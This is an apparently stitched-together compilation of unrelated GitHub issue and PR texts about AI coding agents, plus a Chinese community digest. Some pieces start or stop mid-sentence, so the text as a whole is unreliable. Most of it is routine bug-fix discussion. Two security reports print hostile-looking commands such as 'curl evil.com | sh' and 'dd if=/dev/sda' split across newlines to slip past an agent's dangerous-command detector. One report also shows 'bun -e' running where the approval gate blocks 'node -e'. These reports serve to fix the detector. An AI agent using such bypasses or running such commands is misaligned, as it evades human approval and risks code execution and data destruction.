The parent core client already invokes the always-on safety tier before the skipLoopDetection-gated heuristic tier, clears pending tool calls, yields LoopDetected, and returns when an always-on guard fires; before the change its comments enumerate only the exact-call guard and per-turn cap.

The pinned loop-detection service adds an eight-call shell-inspection threshold, dedicated last-key and streak state, a run_shell_command semantic bucket, shell-chain segmentation, read-only git overview classification, overview-diff operand validation, and reset behavior on nonmatching commands, Retry, and prompt reset.

The pinned core client runs the new shell stagnation check in the always-on tier before the skipLoopDetection gate; on detection it clears pending tool calls, yields LoopDetected with the last loop type, reports the error, cleans up, and returns.

The pinned telemetry enum defines SHELL_COMMAND_STAGNATION, and the non-interactive CLI maps it to a human-readable repeated-shell-inspection message and marks it as an always-on guard that cannot be disabled through model.skipLoopDetection.

The pinned service test file adds the shell-stagnation threshold and deterministic coverage for the eighth-call halt, non-inspection and Retry resets, explicit disable, write-bearing and mixed-chain exclusions, non-git exclusions, newline-separated variants, and file-specific diff exclusions.

The commit diff contains the four-file implementation/test/telemetry/CLI changes described by the episode, including the service guard, new loop type, CLI label, call-site contract comments, and regression tests.

The PR reports 72 core loop-detection tests, 57 CLI tests with one skipped, lint, typecheck, build, bundle, and a deterministic bundled-CLI E2E passing; the E2E served eight completion requests, executed seven tool results, and halted with shell_command_stagnation on the eighth request.

unresolved_questions: The PR explicitly reports no Windows or Linux local run and uses a fake OpenAI-compatible endpoint rather than a live DeepSeek endpoint, so platform-specific and provider-specific behavior remains deferred [EV-VALIDATION-PR].

title: Issue 228 — preserve caller-owned conversation history across a continued turn

issue.title: run_conversation() mutates the caller's conversation_history list
issue.body:
`run_conversation()` in `run_agent.py` creates an alias instead of a copy of the `conversation_history` parameter (line 1846):

```python
messages = conversation_history or []
```

Since `messages` is the same object as the caller's list, every `messages.append()` during the conversation (user messages, assistant responses, tool calls, etc.) also modifies the caller's original list. After a single `run_conversation()` call, the caller's `conversation_history` list contains all the new messages that were added during the conversation.

This is a well known Python mutable default argument pitfall. `dict.get("key", "")` has the same class of issue - `or` only creates a new list when `conversation_history` is falsy (`None` or `[]`), but when a non-empty list is passed, it becomes a direct alias.

The CLI works around this by passing a slice (`self.conversation_history[:-1]`), which creates a new list. But the underlying API contract is broken - any caller passing a list and expecting it to remain unchanged will get unexpected mutations.

comments.body:
Fixed via PR #229 (merged in 56b53bf). Changed `messages = conversation_history or []` to `messages = list(conversation_history) if conversation_history else []` so the caller's list is never mutated.

Includes regression test verifying the original list length is unchanged after `run_conversation()`.

## Problem

`run_conversation()` in `run_agent.py` creates an alias instead of a copy of the `conversation_history` parameter:

messages = conversation_history or []

issue.title: fix(relay): restore voice-note STT — wire media[] MIMEs, message_type "voice", and a User-Agent for CDN downloads

repository.name: hermes-agent
repository.description: The agent that grows with you

issue.body:
## Three wire-boundary fixes for relayed media

Pairs with **gateway-gateway #228** (merged, live on staging — puts `"voice"` on the wire). Together these restore voice-note transcription over the relay, and fix all relayed Discord media as a side effect.

### 1. `media[]` MIMEs were dropped → per-attachment routing broken

The connector's rich `media[]` array (per-attachment `mime`/`kind`/`size`/`filename`) was discarded at `_event_from_wire` — only `media_urls` survived — so `event.media_types` was always `[]` and every per-attachment classifier in `run.py` fell back to the message-level type. Now mapped, positionally aligned.

**Pairing is by URL, and survives localization** (both hardened after review — the first version of this PR got it wrong):

- `_media_types_from_wire()` resolves each `media_urls[i]`'s MIME via a `url -> mime` lookup over `media[]`, never by position. A length check alone was not alignment: equal-length-but-reordered wire fields paired wrongly, and an absent `media_urls` skipped the check entirely. An unmatched URL degrades to `""` (message-level classification).
- **`media_types` is always `len(media_urls)`**, padded with `""`. Not cosmetic: `merge_pending_message_event` (`gateway/platforms/base.py:2725`) *extends* both lists when a second media message merges into a pending one, so a populated `media_urls` with an empty `media_types` (older connector: urls but no `media[]`) concatenated lists of different lengths and shifted every later MIME onto the wrong url.
- `_localize_inbound_media()` now carries `(url, mime)` as **pairs**, and rewrites the MIME list unconditionally (no `if types:` short-circuit leaving a stale list). It previously filtered `media_urls` — dropping a dead connector re-host is a *normal* best-effort path — without filtering `media_types`, so every surviving attachment inherited its neighbour's MIME:

```
before  urls  [.../relay/media/dead, .../kept.png]
        types [application/pdf, image/png]
after   urls  [.../kept.png]
        types [application/pdf, image/png]      <-- the PNG reads as a PDF
_event_media_is_image(ev, 0) -> False
```

### 2. `"voice"` → `MessageType.VOICE`

Parsed by the pre-existing enum branch; pinned by test so a refactor can't collapse the voice/music distinction again. No `run.py` change needed — the existing STT gate works once the inputs arrive intact.

### 3. Discord CDN downloads 403'd — no User-Agent (found during live validation)

`RelayMediaClient` never set a User-Agent, and Discord's CDN rejects urllib's default `Python-urllib/x.y` with **HTTP 403**. `_localize_inbound_media` then kept the raw URL, and the consumer tried to open a URL as a file path:

```
WARNING gateway.relay.media: relay media download failed for
  https://cdn.discordapp.com/...voice-message.ogg: HTTP Error 403: Forbidden
INFO gateway.run: Voice transcription failed for https://cdn.discordapp.com/...
  : Audio file not found: https://cdn.discordapp.com/...
```

This killed **all** Discord relay inbound media — images and documents too, not just voice. Telegram/WhatsApp were unaffected because their media is connector-re-hosted (`/relay/media/{id}`, fetched from our own host) and localizes to real `/tmp` paths.

Reproduced from a clean shell against a live CDN URL:

| client | result |
|---|---|
| `curl` (sends its own UA) | 200 |
| `urllib`, no UA | **403 Forbidden** |
| `urllib` + descriptive UA | 200, 14583 bytes, `OggS` magic |

## Live validation on staging

Not just unit-green — the whole chain was exercised on `hermes-agent-stg-test-6698`:

1. gg #228 merged → staging auto-deployed `cc02e6f6d`; a paired Discord+Telegram voice probe confirmed the wire flipped to `message_type:"voice"` on both lanes, `admitted_instances:1`.
2. STT was invoked **for the first time** (previously no transcription log lines existed at all) — proving the routing fix works end-to-end.
3. It then failed on a *pre-existing* instance issue: `stt.provider` was unset, so autodetect chose local faster-whisper, which couldn't download its 145 MB model onto a 98%-full volume. Switched that instance to the managed provider (`stt.provider: nous`) — an instance config matter, not a code one.
4. Telegram + WhatsApp then transcribed successfully; Discord still failed → root-caused to the 403 above, hot-patched on the instance, and **Ben confirmed the Discord voice note transcribed**. Zero new 403s and zero new transcription failures after the patch.

## Rollout (accurate — corrected during review)

`MessageType.VOICE` **predates this PR** (`gateway/platforms/base.py:2285`) and the STT gate's VOICE branch doesn't consult `media_types`, so a new connector against an *old* gateway already fires STT — an old gateway does **not** squash the value.

| Connector | Gateway | Result |
|---|---|---|
| old | old | voice stays `AUDIO`; no auto-STT |
| old | new | still `AUDIO`; no auto-STT — unchanged |
| new (live now) | old | `"voice"` → existing `VOICE`; **STT fires**, but Discord media still 403s |
| new | new | **STT fires**, MIMEs correct, Discord media downloads |

Music uploads (`message_type:"audio"`, `audio/mpeg`) are never STT-eligible in any combination — asserted directly.

## Tests

`tests/gateway/relay/test_wire_voice_media.py` (11) + `test_relay_media.py` (+1):

- **RED-first (4):** the three `media_types` mapping assertions (failed with `[]` on main) and the User-Agent assertion (failed with `{}` — no header at all).
- **Characterization (3):** `voice`/`audio` enum parse + no-media case — pass on main by design; they pin behaviour a refactor could break.
- **STT gate (4):** `_event_media_is_stt_input` asserted directly on real wire-parsed events — the actual acceptance criterion.
- **URL↔MIME pairing + length invariant (9):** resolution by URL (incl. reordered and length-mismatched wire fields, unmatched URL, absent `media_urls`) plus the end-to-end case — wire parse → `_localize_inbound_media` dropping the first attachment → `run.py` classifier — proving the retained attachment keeps its own MIME. The pre-existing localization test could not catch this: it builds events without `media_types`.

**Mutation-verified** (all six): deleting the gate's `VOICE` branch turns the STT tests RED; removing the UA from `download()` fails the media test while its five siblings stay green; reinstating the URL-only filter in localization fails 1; reverting to positional MIME resolution fails 3; removing the length padding fails 4; restoring the `if types:` guard fails 1.

Regression: relay suite **262 passed**; gateway media/voice/stt/audio selection **689 passed**; ruff clean; cross-repo integration payload re-verified after the rework.

issue.body:
Fork half of nolgiainc/nolgia-agent#228 (tester-feedback sweep 2026-09-07, lane K). Companion chart PR: nolgiainc/nolgia-agent#231 (merged, `bc6305d`).

## Why no runtime change for the two #228 shapes

**Part 1 — terminal guard crash on a binary first token.** Reproduced against the guard as shipped in the prod image (`nolgia-2063c21611`, pre-sync) by driving it the way `tools/terminal_tool.py` did there: `ValueError: embedded null byte`. The 2026-09-05 upstream sync (#45) already carries the whole-class fix — `_has_binary_magic` sniff, NUL rejected at path ingestion (`_expand_candidate_path`), `read_remote_script` output sanitized (`_sanitize_remote_script_text`), `os.open` tolerating `ValueError`, and `contains_gateway_lifecycle_command_or_referenced_script` made total (never raises). `main` (what stg runs) has it; prod does not until its image pin moves off `nolgia-2063c21611`.

**Part 2 — `execute_code` sandbox strips `NOLGIA_TOKEN`.** The grant that works without touching the scrub is `terminal.env_passthrough: [NOLGIA_TOKEN, NOLGIA_API_URL]` in `config.yaml`: `tools/env_passthrough._load_config_passthrough` reads it, neither name is a Hermes provider credential (not in `_HERMES_PROVIDER_ENV_BLOCKLIST`, no registry/`OPTIONAL_ENV_VARS` entry, not `_is_hermes_internal_secret`), `_scrub_child_env` passes allowlisted names before the secret-substring block, and `_build_child_env` then applies the NOL-413 run-token substitution. The nolgia-agent chart seeds + reconciles that block (#231), which reaches prod on the next pod roll without an image bump.

## What lands here

- `tests/tools/test_nolgia_guards_via_registry.py` — the #228 shapes through the **registered tools** (repo bar: 1–2 invariant tests per fix via `registry.dispatch`, per AGENTS.md and the Codex review on the first push):
  - `terminal`: the incident command (ELF as the first token) and its residue (a NUL-bearing path token) both reach the backend; a lifecycle wrapper script next to the binary is still blocked.
  - `execute_code`: with the chart-seeded grant a real child observes exactly `NOLGIA_TOKEN` (the bound run token) and `NOLGIA_API_URL` while `OPENAI_API_KEY` / `API_SERVER_KEY` stay withheld; without the grant it observes neither (the #228 failure mode, kept explicit so the chart dependency is).
- `hermes_cli/cli_terminal_mixin.py` + one test — **CI unblock**: `Python tests / slice 1/8` failed twice on this PR in an untouched upstream test (`test_focus_regain_redraw_is_rate_limited`, `[] == ['redraw']`) while passing locally and on `main`'s last run. `_schedule_focus_regain_redraw` defaulted the last-redraw stamp to `0.0`; `time.monotonic()` counts from boot on Linux, so a freshly booted runner with uptime < 60 s treated the clock origin as a recent redraw and swallowed the first repaint. `None` sentinel; the regression test pins a 5 s clock (red on the old code).

History note: Codesmith pushed two commits to this branch (`4fff891`, `f230349`) rewriting the tests registry-style; the final module keeps that approach, adds the negative execute_code contract and the NUL-path shape, and makes it self-contained (registers `execute_code` by import, seeds `approvals.mode: "off"` like the unattended pod so the approval gate does not block the headless dispatch — the bot's version returned `BLOCKED` in a bare process).

Local (`scripts/run_tests.sh --files tests/tools/test_nolgia_guards_via_registry.py:tests/cli/test_cli_force_redraw.py`): 25 passed, 0 failed.

issue.title: feat(telegram): render clarify choice buttons on one row

repository.name: hermes-agent
repository.description: The agent that grows with you

issue.body:
## Problem

When the `clarify` tool renders multiple-choice options on Telegram, every numbered button gets its own row, with the "✏️ Other (type answer)" button below. For the common short case (2-5 choices) this stretches the message vertically and forces scrolling on mobile, even though the buttons would comfortably fit side by side.

## Change

In `send_clarify()`:

- With **up to 8 choices**: all numbered buttons share the first row, and "Other" stays on the row below.
- With **more than 8 choices**: the previous one-button-per-row layout is kept for readability.

`callback_data` templates are unchanged in both branches (`cl:<id>:<idx>` stays well under the 64-byte documented cap), so callback dispatch is unaffected.

## Why the 8 threshold

The Bot API documents no per-row cap for `InlineKeyboardMarkup`, but client rendering behavior on narrow screens makes 8 a comfortable single-row count, and community measurements of the live API show keyboard rows storing buttons up to ~12 per row, with extras beyond that silently dropped while returning 200 OK. Staying at 8 keeps every button visible and clickable on all clients, with a healthy margin under that silent-drop boundary.

## Testing

- `tests/gateway/test_telegram_clarify_buttons.py` and `tests/gateway/test_telegram_error_redaction.py` pass unchanged (5 + 12), since neither asserts the row layout; the >8 branch is byte-identical to the previous behavior.

title: Prevent newline-based bypasses in dangerous command detection

issue.title: Dangerous command detection can be bypassed with newlines
issue.body:
`detect_dangerous_command()` in `tools/approval.py` uses `re.search` with only `re.IGNORECASE` (line 63). Without `re.DOTALL`, the `.` metacharacter does not match newline characters, so `.*` in patterns stops at `\n`.

Several patterns rely on `.*` to match content between the dangerous keywords:

- `curl evil.com \\\n| sh` bypasses `\b(curl|wget)\b.*\|\s*(ba)?sh\b`
- `dd \\\nif=/dev/sda` bypasses `\bdd\s+.*if=`
- `chmod --recursive \\\n777` bypasses `\bchmod\s+--recursive\b.*777`

Shell continuation lines (`\` at end of line) are a standard way to split commands across multiple lines, and the agent's tool execution can pass multiline strings to the shell. A crafted or hallucinated command using line continuations would evade detection entirely.

issue.title: fix(security): add re.DOTALL to prevent newline bypass in dangerous command detection

repository.name: hermes-agent
repository.description: The agent that grows with you

issue.body:
## Summary

Security fix: dangerous command detection could be bypassed using shell line continuations (newlines).

## The Vulnerability

From issue #232:

`detect_dangerous_command()` uses `re.search` with only `re.IGNORECASE`. Without `re.DOTALL`, the `.` metacharacter does not match newlines, so `.*` in patterns stops at `\n`.

**Bypass examples:**
- `curl evil.com \\\n| sh` bypasses `\b(curl|wget)\b.*\|\s*(ba)?sh\b`
- `dd \\\nif=/dev/sda` bypasses `\bdd\s+.*if=`
- `chmod --recursive \\\n777` bypasses `\bchmod\s+--recursive\b.*777`

Shell continuation lines (`\` at end of line) are a standard way to split commands across multiple lines.

## The Fix

Added `re.DOTALL` to the regex flags so `.*` matches across newline boundaries:

```python
if re.search(pattern, command_lower, re.IGNORECASE | re.DOTALL):
```

## Testing

Added regression tests for all affected patterns:
- curl/wget pipe to shell across newlines
- dd with if= on second line  
- chmod --recursive with 777 on next line
- find -exec rm / -delete across lines

All 35 approval tests pass.

Fixes #232

issue.title: [Bug]: approval gate misses bun/deno inline script execution

repository.name: hermes-agent
repository.description: The agent that grows with you

issue.body:
### Summary

The dangerous-command detector does not recognize inline script execution through Bun or Deno.

Commands such as `node -e` and `python -c` are flagged for approval, while equivalent `bun` and `deno` commands are not. In single-query mode this means `node -e` is refused, but `bun -e` can execute without approval.

### Environment

- Hermes Agent `0.21.3` (checkout `afaa53e5fe`, 2026-09-19)
- Windows 11, native
- Reproduced both through `detect_dangerous_command` directly and in a live single-query session

### Reproduction

Calling the detector directly:

```python
import sys
sys.path.insert(0, "<checkout>")

from tools import approval_detection as ad

for cmd in (
    'node -e "console.log(1)"',
    'python -c "print(1)"',
    'perl -e "print 1"',
    'ruby -e "puts 1"',
    'bun -e "console.log(1)"',
    'bun --eval "console.log(1)"',
    'deno eval "console.log(1)"',
    'deno -e "console.log(1)"',
):
    print(cmd, "->", ad.detect_dangerous_command(cmd))
```

Observed:

```text
node -e "console.log(1)"    -> (True,  'script execution via -e/-c flag', ...)
python -c "print(1)"        -> (True,  'script execution via -e/-c flag', ...)
perl -e "print 1"           -> (True,  'script execution via -e/-c flag', ...)
ruby -e "puts 1"            -> (True,  'script execution via -e/-c flag', ...)
bun -e "console.log(1)"     -> (False, None, None)
bun --eval "console.log(1)" -> (False, None, None)
deno eval "console.log(1)"  -> (False, None, None)
deno -e "console.log(1)"    -> (False, None, None)
```

The difference is also visible in a live single-query session:

```text
$ node -e "console.log(process.cwd())"

BLOCKED: Command flagged as dangerous (script execution via -e/-c flag) but single-query
mode (-q) runs without a user present to approve it. Find an alternative approach that
avoids this command.
```

Equivalent Bun command:

```text
$ bun -e "console.log(process.cwd())"

C:\Users\prunk\AppData\Local\Temp\a06 fixtüré ünïcode
```

`node -e` is refused by the approval gate, while `bun -e` executes normally.

### Cause

`tools/approval_detection.py` only includes four runtimes in the inline-script pattern:

```python
"script execution via -e/-c flag": "(python[23]?|perl|ruby|node)\\s+-[ec]\\s+",
```

The per-tool flag map has the same gap:

```python
"python": {"-c"},
"node": {"-e", "--eval", "-p", "--print"},
"perl": {"-e", "--eval"},
"ruby": {"-e"},
```

Neither path includes Bun or Deno, so their inline execution forms are not classified the same way as the existing runtimes.

### Impact

Approval behavior depends on which installed runtime is used for otherwise equivalent inline script execution.

This is especially visible in single-query mode, where commands classified as dangerous cannot be interactively approved. A command rejected through Node can therefore run through Bun without reaching the same approval path.

This is a detection gap, not a sandbox escape. The problem is the inconsistent enforcement of the existing approval policy.

### Suggested fix

Add Bun and Deno to both inline-script detection paths, covering their supported inline execution forms such as:

- Bun: `-e`, `--eval`
- Deno: `eval`, `-e`, `--eval`

It would also be useful to add regression tests asserting that equivalent inline execution commands receive the same classification across supported runtimes.

On Windows, executable-name matching should remain case-insensitive.

### Related issues

I found several related approval-detection issues, but none appear to cover this specific gap:

- #115209: `python -c` false positive affecting Hermes' own workflow
- #102847: Windows false positive involving `powershell -File`
- #110961 and #90136: ineffective allowlist rule keys
- #232: approval bypass using newlines rather than an unlisted runtime

title: Recover long streamed answers after mid-stream transport cuts without replaying or duplicating delivered text

issue.title: YOLO mode: mid-stream socket close is not retried, making large code generation impossible
issue.body:
## What happened?

In YOLO mode (`--yolo` / `-p` headless), generating large code output
(500+ lines, e.g. a complete HTML game) consistently fails with:

[API Error: terminated (cause: UND_ERR_SOCKET: other side closed)]

The DashScope gateway closes the TCP connection after ~3-5 minutes of
SSE streaming. This is 100% reproducible (5/5 attempts).

## Root cause analysis

The OpenAI SDK's stream-transport retry is gated on `!streamYieldedChunk`.
Once thinking/reasoning chunks have started flowing (which happens within
seconds for thinking models), a mid-stream socket close does NOT trigger
retry — it throws directly.

YOLO mode compounds this: the entire think → tool → think → tool loop
runs as a single uninterrupted SSE stream (3-5 min), while interactive
plan mode breaks it into independent short requests (each <30s) that
never hit the gateway timeout.

## Evidence

| Test | Result |
|------|--------|
| YOLO + large generation (5 attempts) | ❌ All fail with UND_ERR_SOCKET |
| Plan mode + same prompt | ✅ Works |
| Python httpx + same API + same model | ✅ Works (7+ min stream) |
| Modified undici keepAliveTimeout 60s→600s | ❌ Still fails |
| Small tasks in YOLO (<100 lines) | ✅ Works |

## Expected behavior

Mid-stream socket closes should be retried (at least once) even after
chunks have been yielded, similar to how connection-level errors are
retried. The `!streamYieldedChunk` gate is too conservative for
thinking models that produce long streams.

## Suggested fix

1. In `classifyRetryError`, classify `UND_ERR_SOCKET` as
   `{kind:'transport', diagnosis:'retryable'}` regardless of
   `streamYieldedChunk` state
2. On retry, send the accumulated partial output as context so the
   model can continue from where it left off
3. Alternatively: in YOLO mode, automatically break long generations
   into multi-turn (plan → execute → verify) instead of one stream

## Environment

- Qwen Code: v0.21.0
- Node.js: v22.13.1
- OS: Windows 10
- Model: qwen3.8-max-preview (thinking model)
- API: DashScope Token Plan (token-plan.cn-beijing.maas.aliyuncs.com)

## Triage

- **Type**: bug
- **Labels**: `type/bug`, `category/core`, `scope/non-interactive`, `priority/P1`, `welcome-pr`
- **Next**: Root cause confirmed in source — see analysis below. Community PRs welcome.

**Root cause confirmed.** The reporter's analysis is accurate. In `geminiChat.ts` (~line 2579), the transport stream retry is gated on `!streamYieldedChunk`:

```
if (
  isRetryableStreamTransportError &&
  !streamYieldedChunk &&
  transportStreamRetryCount < TRANSPORT_STREAM_RETRY_CONFIG.maxRetries
)
```

`UND_ERR_SOCKET` is correctly classified as a retryable transport error (`retryErrorClassification.ts` → `TRANSPORT_ERROR_CODES`, and `stream-transport-retry.ts` → `RETRYABLE_STREAM_TRANSPORT_CODES`). However, once any thinking/reasoning chunk has been yielded (which happens within seconds for thinking models), `streamYieldedChunk` becomes `true` and the retry is skipped entirely — the error propagates as a fatal failure. The code even logs this decision: `retryDecision: 'skipped_after_chunk'`.

The design rationale is sound for short streams (replaying after chunks would duplicate output), but for YOLO mode with thinking models, the entire think → tool → think loop runs as a single 3–5 minute SSE stream, making mid-stream socket closes from the DashScope gateway effectively unrecoverable.

**Fix direction** (for a future PR):
1. The simplest approach: allow transport retry after chunks have been yielded, but send accumulated partial output as context so the model continues rather than restarts. This requires the retry path to preserve and re-inject partial content.
2. Alternative: in YOLO/headless mode, break long generations into multi-turn automatically, keeping each individual stream short enough to avoid the gateway timeout.
3. The `keepAliveTimeout` tuning the reporter tried won't help — the gateway closes the connection server-side, not the client.

---

## Stage 2: Source Analysis

**Reproduction**: not executed — the bug requires the DashScope gateway to close a long-lived SSE connection server-side after 3–5 minutes, which cannot be simulated in a local tmux session without the specific gateway timeout behavior. The reporter's 5/5 reproduction table is consistent with the code path.

**Affected code path** (all in `packages/core/src/`):

| File | Role |
|------|------|
| `core/geminiChat.ts:2460` | `streamYieldedChunk` flag set on first non-tool-prep chunk |
| `core/geminiChat.ts:2579` | `!streamYieldedChunk` gate blocks transport retry after chunks |
| `core/geminiChat.ts:2608` | Logs `retryDecision: 'skipped_after_chunk'` when gate fires |
| `core/stream-transport-retry.ts` | `RETRYABLE_STREAM_TRANSPORT_CODES` includes `UND_ERR_SOCKET` ✓ |
| `utils/retryErrorClassification.ts` | `TRANSPORT_ERROR_CODES` includes `UND_ERR_SOCKET` ✓ |
| `core/geminiChat.ts:460` | `TRANSPORT_STREAM_RETRY_CONFIG`: maxRetries=2, initialDelayMs=1000 |

**Test coverage**: `geminiChat.test.ts:7280` — the test `'does not retry retryable transport stream errors after yielding a chunk'` explicitly codifies the current behavior: yields one chunk, throws `UND_ERR_SOCKET`, asserts exactly 1 API call (no retry) and 0 RETRY events. Any fix must update this test.

**Confidence**: confirmed — the code path, classification, and gate are all verified in source. The existing test proves the behavior is intentional but overly conservative for long-stream scenarios.

- **标签**: `type/bug`, `category/core`, `scope/non-interactive`, `priority/P1`, `welcome-pr`

`UND_ERR_SOCKET` 在 `retryErrorClassification.ts` 和 `stream-transport-retry.ts` 中都被正确分类为可重试的 transport 错误，但 `streamYieldedChunk` 门控阻止了重试。

**修复方向**：
1. 最简方案：允许 chunk yield 后的 transport 重试，但将已累积的部分输出作为上下文发送，让模型继续而非重新开始。
2. 替代方案：YOLO/headless 模式下自动将长生成拆分为多轮，保持每个流足够短以避免网关超时。
3. 报告者尝试的 `keepAliveTimeout` 调整无效——是网关服务端关闭连接，不是客户端。

**复现**：未执行——需要 DashScope 网关在 3-5 分钟后服务端关闭长连接，本地 tmux 无法模拟。报告者 5/5 的复现结果与代码路径一致。

**测试覆盖**：`geminiChat.test.ts:7280` 明确测试了当前行为（yield chunk 后不重试）。任何修复都必须更新此测试。

**置信度**：已确认——代码路径、分类、门控均在源码中验证。

</details>

— _Qwen Code · qwen3.8-max-preview_

Thanks for the thorough report and repro matrix — your analysis is spot-on.

**Confirmed root cause.** The gate is at `packages/core/src/core/geminiChat.ts:2579`:

```typescript
if (
  isRetryableStreamTransportError &&
  !streamYieldedChunk &&  // ← blocks retry once ANY non-tool-prep chunk flows
  transportStreamRetryCount < TRANSPORT_STREAM_RETRY_CONFIG.maxRetries
)
```

`UND_ERR_SOCKET` is already in `RETRYABLE_STREAM_TRANSPORT_CODES` (`stream-transport-retry.ts:10-17`) and `classifyRetryError` correctly returns `{kind:'transport', diagnosis:'retryable'}` — so classification is not the problem. The sole blocker is the `!streamYieldedChunk` condition.

**Why thinking models hit this disproportionately.** `streamYieldedChunk` is set for any chunk where `isToolCallPreparationOnly()` returns false (`:2482-2484`). Thinking/reasoning chunks carry `candidate.content.parts` (thought parts), so they trip the flag immediately — within seconds of stream start. For a thinking model like qwen3.8-max-preview, the socket then dies 3-5 minutes later during the still-ongoing thinking phase, but retry is already locked out even though zero *content* has reached the user.

**Fix direction (near-term, targeted):**

Refine the gate to distinguish thinking-only output from user-visible content. Concretely: track a separate `streamYieldedContentChunk` that is only set when a chunk contains non-thought parts (text, functionCall). Then:

```typescript
if (
  isRetryableStreamTransportError &&
  !streamYieldedContentChunk &&  // allow retry during thinking-only phase
  transportStreamRetryCount < TRANSPORT_STREAM_RETRY_CONFIG.maxRetries
)
```

This is safe because thinking tokens are ephemeral — they are not recorded as the assistant's final response in history, so replaying the request produces no duplicate user-visible output. It directly covers your scenario (socket dies during the long think phase before any code/text content is emitted).

The existing test at `geminiChat.test.ts:7275` ("does not retry … after yielding a chunk") would need a companion case: "DOES retry after yielding only thinking chunks."

**On your other suggestions:**

- (2) Send partial output as continuation context: correct long-term direction for content-phase failures, but requires API-level continuation semantics and dedup at the yield layer — significantly more complex. Worth a follow-up design doc.
- (3) Break long YOLO generations into multi-turn: orthogonal product behavior; wouldn't fix the underlying transport fragility.

**Related:** #7831 reports the same DashScope gateway idle-timeout (~90s) killing long streams at higher context sizes. Same server-side root cause, same client-side gap.

Marking welcome-pr for the thinking-phase retry refinement. The change is well-scoped: one additional flag in the stream loop + gate condition update + test.

编码崩溃问题；同时，高级用户针对 VS Code 插件中的 UI 响应阻塞、以及 Hooks 生命周期管理的潜在 Bug 展开了深入讨论。 ### 2. 版本发布 **今日无最新 Release。** ### 3. 社区热点 Issues 今日仅有 4 条 Issue 更新，但均涉及核心交互与执行链路，值得重点关注： * **[#2563] VS Code 插件审批提示框偶发不渲染，导致长时间卡顿或静默超时** * **分析**: 这是一个高优 Bug。在使用 `kimi-k3` 模型时，插件的 `ExitPlanMode` 或工具权限确认提示框有时无法渲染，导致任务无故停滞或等待 600 秒后超时。这直接中断了开发者的工作流，是当前 IDE 集成中亟待解决的阻塞性问题。 * **[#2564] PostToolUse / PostToolUseFailure 钩子任务被 GC 提前回收** * **分析**: 深度开发者反馈的底层架构 Bug。在 `config.toml` 中注册的 Hooks 在执行过程中被垃圾回收（GC）静默杀死，导致非确定性的执行失败。此问题影响了 CLI 在复杂自动化流水线中的可靠性。 * **[#2317] [VSCode Extension] Plan 模式下聊天窗口中的文件路径无法点击** * **分析**: 影响开发体验的 UI 交互问题。在 `0.5.10` 版本的 VS Code 插件中，Plan 模式输出的文件路径丢失了跳转能力，降低了代码定位的效率。 * **[#1070] [bug] Login failed: Cannot connect to host auth.kimi.com:443 [CLOSED]** * **分析**: 该问题自 2 月份提出至今正式关闭。涉及 `auth.kimi.com` 的 443 端口 SSL 网络不可达问题，长期困扰部分网络环境下的用户，现已修复并验证。 ### 4. 重要 PR 进展 今日更新的 4 个 PR 全部围绕环境兼容性与 API 底层调度展开： * **[#2561] 修复非 UTF-8 编码环境下启动时的 UnicodeEncodeError** * **内容**: 解决了 Windows 用户在 Git Bash 中启动 CLI 时，因系统默认 GBK 编码无法解析 Banner 字符（`▐`）而直接崩溃的问题。极大地改善了中文 Windows 用户的开箱体验。 * **[#2560] 修复非 UTF-8 编码下 Web 服务启动时的 UnicodeEncodeError** * **内容**: 与 #2561 类似，此 PR 专门修复了在 Windows（中文环境，代码页 936/GBK）下执行 `kimi web` 重定向输出时，由 `➜` 字符引发的编码崩溃。 * **[#2562] 允许禁用 Prompt Cache Key** * **内容**: 在 LLM Provider 配置中增加了 `prompt_cache_key` 开关。当设置为 `false` 时，将不再发送该字段。这为开发者在调试或对接特定第三方代理 API 时提供了更高的灵活度。 * **[#2539] 为 Moonshot API 规范化 MCP (Model Context Protocol) 工具** * **内容**: 核心底层优化。为 MCP 工具名称生成稳定的 Moonshot 兼容别名，同时保留了上游调用的原始名称；此外还修复了 Schema 定义中缺失 `object` 根类型导致的工具调用失败问题。 ### 5. 功能需求趋势 综合近期的 Issue 与 PR，社区当前的发展趋势呈现出以下三大特征： 1. **Windows/多平台兼容性攻坚**：大量精力被投入到解决非 UTF-8（GBK）环境下的编码崩溃问题，表明 Kimi CLI 正在被越来越广泛的本土 Windows 开发者群体采用。 2. **IDE 插件（特别是 VS Code）的 UI/UX 稳定性**：Plan 模式交互缺陷、提示框不渲染等问题频发，说明随着插件功能（如工具权限审批）的丰富，前端 Webview 与底层 Core 的通信机制需要重构或加强稳定性测试。 3. **底层调度与可观测性需求升级**：从开发者自行提交 PR 调整 Cache Key，到反馈 Hooks 被 GC 静默回收，说明高级用户正在将 Kimi CLI 深度集成到其重度自动化工作流中，对生命周期管理的确定性提出了更高要求。 ### 6. 开发者关注点 * **工作流阻塞性体验**：静默超时（如 #2563 中的 600s 超时）和静默失败（如 Hooks 被 GC 回收）是开发者最反感的痛点，社区强烈呼吁在 UI 层增加更明确的错误抛出与状态反馈。 * **本地化开发环境支持**：Windows 中文环境下的终端编码兼容性仍是当前最大的“劝退”因素， thankfully 社区开发者（如 @LHMQ878）正在积极通过 PR 帮助官方修补这一短板。 * **配置的精细化管控**：开发者希望能够细粒度地控制 LLM 的请求参数（如 Cache 的开启与关闭），这反映出用户对于 Token 成本和请求延迟有着精打细算的考量。

Qwen Code — QwenLM/qwen-code 以下是 2026-07-28 的 Qwen Code 社区动态日报。 # 📰 Qwen Code 社区动态日报 (2026-07-28) ## 1. 今日速览 今日 Qwen Code 社区重点关注**安全漏洞修复**与**长上下文性能优化**。安全研究员接连披露了多个涉及 MCP 权限绕过和沙箱逃逸的高危漏洞（P0/P1级），引发了社区的激烈讨论；同时，在处理超长上下文（>150k tokens）和 YOLO 模式下的流式生成时，网络断连（ECONNRESET）和限流（429）成为了开发者反馈的痛点。此外，官方在 Web Shell 上集中落地了原生语音、Git 可视化操作等重大交互升级。 ## issue.title: fix(core): retry mid-stream transport failures as continuations

repository.name: qwen-code
repository.description: An open-source AI coding agent that lives in your terminal.

issue.body:
## What this PR does

Fixes #7832. The stream transport retry used to fire only before the first chunk reached callers, so a socket close anywhere into a long thinking stream (UND_ERR_SOCKET minutes in) propagated and threw away everything already generated. With this change, when chunks have already flowed and the failed attempt left a text or thought partial, the retry runs as a continuation instead: the partial turn stays in history, a recovery user message shows the model its own suffix, and the model picks up where the stream died. One continuation per send; if it fails, the partial turn survives in history and on the transcript, and the error propagates as before.

## Why it's needed

